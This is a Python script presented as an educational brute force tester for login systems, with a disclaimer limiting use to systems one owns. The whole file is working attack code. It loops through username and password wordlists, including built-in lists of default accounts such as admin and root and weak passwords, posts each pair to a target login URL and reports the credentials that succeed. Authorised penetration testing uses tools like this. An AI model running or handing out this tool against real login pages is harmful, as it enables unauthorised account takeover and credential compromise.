#!/usr/bin/env python3
"""
Educational Brute Force Tool for Testing Login Systems
This tool is designed for educational purposes and testing your own applications only.
Use responsibly and only on systems you own or have explicit permission to test.
"""

import requests
import time
import json
from itertools import product
import argparse

class LoginTester:
    def __init__(self, target_url, delay=1):
        self.target_url = target_url
        self.delay = delay
        self.session = requests.Session()
        
    def test_login(self, username, password):
        """Test a single login attempt"""
        try:
            data = {
                'username': username,
                'password': password
            }
            
            response = self.session.post(
                self.target_url,
                data=data,
                timeout=10,
                allow_redirects=False
            )
            
            return {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'response_text': response.text[:200],  # First 200 chars
                'success': self.check_success(response)
            }
            
        except requests.RequestException as e:
            return {
                'username': username,
                'password': password,
                'error': str(e),
                'success': False
            }
    
    def check_success(self, response):
        """Check if login was successful based on response"""
        # Common indicators of successful login
        success_indicators = [
            'dashboard', 'welcome', 'success', 'logged in',
            'profile', 'home', 'main'
        ]
        
        # Common indicators of failed login
        fail_indicators = [
            'invalid', 'incorrect', 'failed', 'error',
            'denied', 'unauthorized', 'wrong'
        ]
        
        response_lower = response.text.lower()
        
        # Check for redirect (often indicates success)
        if response.status_code in [301, 302, 303, 307, 308]:
            return True
            
        # Check response content
        if any(indicator in response_lower for indicator in success_indicators):
            return True
            
        if any(indicator in response_lower for indicator in fail_indicators):
            return False
            
        # Default to checking status code
        return response.status_code == 200

def load_wordlist(filename):
    """Load wordlist from file"""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist file {filename} not found")
        return []

def create_default_wordlists():
    """Create default wordlists for testing"""
    
    # Common usernames
    usernames = [
        'admin', 'administrator', 'root', 'user', 'test',
        'guest', 'demo', 'sa', 'operator', 'manager'
    ]
    
    # Common passwords
    passwords = [
        'password', '123456', 'admin', 'password123',
        'root', 'test', 'guest', 'demo', '12345',
        'qwerty', 'abc123', 'letmein', 'welcome'
    ]
    
    with open('usernames.txt', 'w') as f:
        f.write('\n'.join(usernames))
        
    with open('passwords.txt', 'w') as f:
        f.write('\n'.join(passwords))
    
    print("Created default wordlists: usernames.txt and passwords.txt")
    return usernames, passwords

def main():
    parser = argparse.ArgumentParser(description='Educational Login Brute Force Tester')
    parser.add_argument('url', help='Target login URL')
    parser.add_argument('-u', '--usernames', help='Username wordlist file')
    parser.add_argument('-p', '--passwords', help='Password wordlist file')
    parser.add_argument('-d', '--delay', type=float, default=1.0, 
                       help='Delay between requests (seconds)')
    parser.add_argument('--create-wordlists', action='store_true',
                       help='Create default wordlists')
    
    args = parser.parse_args()
    
    if args.create_wordlists:
        create_default_wordlists()
        return
    
    # Load wordlists
    if args.usernames:
        usernames = load_wordlist(args.usernames)
    else:
        usernames = ['admin', 'user', 'test']
        
    if args.passwords:
        passwords = load_wordlist(args.passwords)
    else:
        passwords = ['password', '123456', 'admin']
    
    if not usernames or not passwords:
        print("No valid wordlists found. Use --create-wordlists to generate defaults.")
        return
    
    print(f"Testing {len(usernames)} usernames with {len(passwords)} passwords")
    print(f"Total combinations: {len(usernames) * len(passwords)}")
    print(f"Delay between requests: {args.delay} seconds")
    print(f"Target URL: {args.url}")
    print("-" * 50)
    
    tester = LoginTester(args.url, args.delay)
    successful_logins = []
    
    try:
        for username in usernames:
            for password in passwords:
                print(f"Testing: {username}:{password}", end=" ... ")
                
                result = tester.test_login(username, password)
                
                if 'error' in result:
                    print(f"ERROR: {result['error']}")
                elif result['success']:
                    print("SUCCESS!")
                    successful_logins.append(result)
                else:
                    print(f"Failed (Status: {result['status_code']})")
                
                time.sleep(args.delay)
                
    except KeyboardInterrupt:
        print("\nTesting interrupted by user")
    
    print("\n" + "="*50)
    print("RESULTS SUMMARY")
    print("="*50)
    
    if successful_logins:
        print("Successful logins found:")
        for login in successful_logins:
            print(f"  {login['username']}:{login['password']}")
    else:
        print("No successful logins found")

if __name__ == "__main__":
    main()